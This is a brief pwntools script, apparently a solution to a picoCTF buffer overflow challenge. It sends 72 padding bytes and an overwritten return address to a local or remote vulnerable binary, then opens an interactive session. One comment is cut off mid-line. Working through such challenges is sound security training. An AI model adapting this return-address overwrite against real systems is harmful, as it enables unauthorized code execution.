from pwn import *

elf = ELF('/home/kali/Downloads/vuln')
libc = elf.libc

if args.REMOTE:
    p = remote('saturn.picoctf.net',55279)
else:
    p = process(elf.path)

# payload buffer
payload = b'A'*72
payload += p64(0x40123b) # Jump to the second instruction (the one after the first push instaed of 0x401236) in the>

print(p.recvuntil(':'))
p.send(payload)
p.interactive()